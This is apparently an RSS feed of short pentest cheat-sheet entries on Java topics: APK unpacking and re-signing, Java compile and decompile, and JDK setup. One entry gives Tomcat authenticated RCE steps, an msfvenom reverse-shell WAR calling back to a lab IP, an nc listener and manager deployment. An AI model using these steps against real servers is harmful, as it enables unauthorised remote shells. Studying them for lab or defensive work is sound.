channel.title: Java on TLDRBins
channel.description: Recent content in Java on TLDRBins

item.title: Android
item.description: Unpack .apk file apktool # Get .smali files java -jar apktool_2.9.3.jar d app.apk jadx # Get .java files jadx app.apk Re-pack .apk file 1. Initial pack java -jar apktool_2.9.3.jar b --use-aapt2 app -o app_repacked.apk 2. zip align zipalign 3. Sign the apk keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias apksigner sign --ks my-release-key.jks --ks-pass pass:<PASSWORD> --out app_final.apk app_repacked.apk Dynamic Debugging 1. Set up +--------------------------------------------------------------------+ | 1.

item.title: Apache Tomcat
item.description: Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war 2. Start a listener rlwrap nc -lvnp 1337 3a. Via Manager GUI +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1. Login to Tomcat Web Application Manager | | 2. WAR file to deploy -> Deploy | | 3. Click /revshell in Applications table | +--------------------------------------------+ 3b. Via Manager Script curl -u '<USERNAME>:<PASSWORD>' http://example.

item.title: Java
item.description: Java Decompile JAR Download jd-gui jd-gui Compile # Compile javac src/program.java # Pack into jar jar -cvf program.jar -C src/ .

item.title: Java Environment
item.description: Set JDK Environment sudo update-alternatives --config java sudo update-alternatives --config javac
